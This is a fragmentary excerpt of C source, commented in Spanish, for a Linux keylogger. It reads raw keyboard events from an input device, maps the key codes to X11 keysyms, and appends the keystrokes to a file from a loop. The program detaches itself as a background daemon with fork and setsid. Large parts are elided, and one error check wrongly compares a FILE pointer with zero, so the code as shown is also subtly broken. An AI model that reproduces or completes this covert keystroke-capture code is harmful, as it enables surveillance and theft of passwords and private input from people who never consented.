...
void keylogger(const char *out, const char *dev) {
  // ubicacion del archivo de dispOsitivo de teclado cambia dependiendo el
  // sistema
  ...
  // mapeo de teclas es diferente a la del resto del SO
  // Afortunadamente, la diferencia entre una y otra tabla es de 8 enteros ej.
  ...
  while (1) {
    ...
    // abre archvo a escribir
    FILE *output;
    output = fopen(out, "ab");

    if (output < 0) {
      syslog(LOG_ERR, "No se pudo abrir el archivo");
      exit(EXIT_FAILURE);
    }
    ...
    if ((ev.type == EV_KEY) && (ev.value == 1)) {
      ...
      // las teclas fisicas estas constantes son las mismas en todas
      // las arquitecturas y son independientes de hardware
      // mas info:
      // https://www.kernel.org/doc/html/v4.13/input/event-codes.html#input-event-codes
      switch (ev.code) {
      ...
      // las inicializaciones no cuentan como estatutos
      char string[200];
      KeySym keysym;
      XKeyEvent keyEv = createKeyEvent(display, winFocus, winRoot, True,
                                       ev.code + 8, ac | caps | numlock);
...
int main(int argc, char *argv[]) {
  if ((argc < 3) || (argc > 3)) {
    printf("Error : uso keylogger \\path_dev \\path_output \n");
    exit(EXIT_FAILURE);
  }
  pid_t pid, sid;
  pid = fork();
  ...
  syslog(LOG_NOTICE, "Daemon inicializado");

  sid = setsid();

  if (sid < 0) {
    syslog(LOG_ERR, "No se pudo crear la sesion");
    exit(EXIT_FAILURE);
  }
  ...
  // Crea el archivo y borra su contenido si no existe
  FILE *output;
